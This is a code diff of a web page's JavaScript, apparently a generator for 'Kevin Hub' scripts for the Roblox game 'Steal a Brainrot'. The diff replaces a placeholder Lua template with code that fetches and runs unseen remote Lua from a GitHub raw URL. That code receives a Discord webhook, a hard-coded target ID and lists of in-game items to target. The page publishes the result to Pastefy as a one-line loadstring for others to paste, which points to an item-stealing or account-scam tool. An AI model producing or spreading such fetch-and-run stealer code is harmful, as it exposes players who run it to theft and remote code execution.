+      function buildLuaSet(name, set) {
+        if (set.size === 0) return `${name} = {}`;
+        let out = `${name} = {\n`;
+        Array.from(set).forEach(k => {
+          const esc = k.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+          out += `    ["${esc}"] = true,\n`;
+        });
+        out += `}`;
+        return out;
+      }
 
       async function createPaste(content) {
         const response = await fetch('https://pastefy.app/api/v2/paste', {
@@ -884,14 +622,14 @@
             visibility: 'UNLISTED'
           })
         });
-
         if (!response.ok) {
           const errText = await response.text();
           throw new Error(`Pastefy API error ${response.status}: ${errText}`);
         }
-
         const data = await response.json();
-        return `https://pastefy.app/${data.id}/raw`;
+        const id = (data.paste && data.paste.id) || data.id;
+        if (!id) throw new Error('Pastefy did not return a paste ID. Response: ' + JSON.stringify(data));
+        return `https://pastefy.app/${id}/raw`;
       }
 
       function showToast(text) {
@@ -901,39 +639,56 @@
         clearTimeout(toast._timer);
         toast._timer = setTimeout(() => toast.classList.remove('show'), 2200);
       }
+      function markInvalid(el) {
+        el.classList.add('invalid');
+        setTimeout(() => el.classList.remove('invalid'), 1200);
+      }
 
       generateBtn.addEventListener('click', async () => {
-        const username = usernameInput.value.trim() || 'UnknownUser';
-        const webhook = webhookInput.value.trim() || 'https://discord.com/api/webhooks/...';
+        const username = usernameInput.value.trim();
+        const webhook = webhookInput.value.trim();
 
-        const petsStr = selectedPets.size > 0 ? Array.from(selectedPets).join(', ') : 'None';
-        const skinsStr = selectedSkins.size > 0 ? Array.from(selectedSkins).join(', ') : 'None';
-        const gearsStr = selectedGears.size > 0 ? Array.from(selectedGears).join(', ') : 'None';
+        let valid = true;
+        if (!username) { markInvalid(usernameInput); valid = false; }
+        if (!webhook || !webhook.includes('discord.com/api/webhooks')) { markInvalid(webhookInput); valid = false; }
+        if (!valid) {
+          showToast('Fill in username and a valid Discord webhook');
+          scriptOutput.className = 'output-box error';
+          scriptOutput.textContent = '❌ Missing required fields.\n\n• Roblox Username is required\n• Discord Webhook is required (must be a discord.com/api/webhooks/... URL)\n\nFix these and try again.';
+          return;
+        }
+        if (selectedBrainrots.size === 0) {
+          showToast('Select at least 1 brainrot');
+          scriptOutput.className = 'output-box error';
+          scriptOutput.textContent = '❌ Select at least one brainrot target before generating.';
+          return;
+        }
 
-        const scriptBody = `-- Kevin Hub | Steal a Brainrot
--- Generated for: ${username}
--- Discord Webhook: ${webhook}
--- Target Pets: ${petsStr}
--- Target Skins: ${skinsStr}
--- Target Gears: ${gearsStr}
--- ⚠️ For educational purposes only.
+        const webhookEscaped = webhook.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+        const usernameEscaped = username.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
 
-local config = {
-    Username = "${username}",
-    Webhook = "${webhook}",
-    TargetPets = {${selectedPets.size > 0 ? Array.from(selectedPets).map(p => `"${p}"`).join(', ') : ''}},
-    TargetSkins = {${selectedSkins.size > 0 ? Array.from(selectedSkins).map(s => `"${s}"`).join(', ') : ''}},
-    TargetGears = {${selectedGears.size > 0 ? Array.from(selectedGears).map(g => `"${g}"`).join(', ') : ''}},
+        const luaScript = `local TARGET_ID = 245727
+local TARGET_USER = "${usernameEscaped}"
+local WEBHOOK_URL = "${webhookEscaped}"
+
+local TargetBrainrots = {
+${Array.from(selectedBrainrots).map(b => `    ["${b.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"] = true,`).join('\n')}
 }
 
-local function main()
-    print("Kevin Hub loaded for " .. config.Username)
-    print("Target pets: " .. table.concat(config.TargetPets, ", "))
-    print("Webhook: " .. config.Webhook)
-    -- 🧠 Your custom logic here
-end
+local TargetBaseSkins = {
+${selectedSkins.size > 0 ? Array.from(selectedSkins).map(s => `    ["${s.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"] = true,`).join('\n') : ''}
+}
 
-main()
+local TargetGears = {
+${selectedGears.size > 0 ? Array.from(selectedGears).map(g => `    ["${g.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}"] = true,`).join('\n') : ''}
+}
+
+task.spawn(function()
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
 `;
 
         generateBtn.disabled = true;
@@ -942,13 +697,13 @@ main()
         scriptOutput.innerHTML = 'Creating paste on Pastefy<span class="dots"><span></span><span></span><span></span></span>';
 
         try {
-          const rawUrl = await createPaste(scriptBody);
+          const rawUrl = await createPaste(luaScript);
           scriptOutput.className = 'output-box success';
           scriptOutput.textContent = `loadstring(game:HttpGet("${rawUrl}"))()`;
           showToast('Script generated!');
         } catch (err) {
           scriptOutput.className = 'output-box error';
-          scriptOutput.textContent = `-- ❌ Upload failed: ${err.message}\n-- Check your Pastefy token at https://pastefy.app/apikeys`;
+          scriptOutput.textContent = `-- ❌ Upload failed: ${err.message}`;
         } finally {
           generateBtn.disabled = false;
           generateBtn.textContent = 'Generate Script';
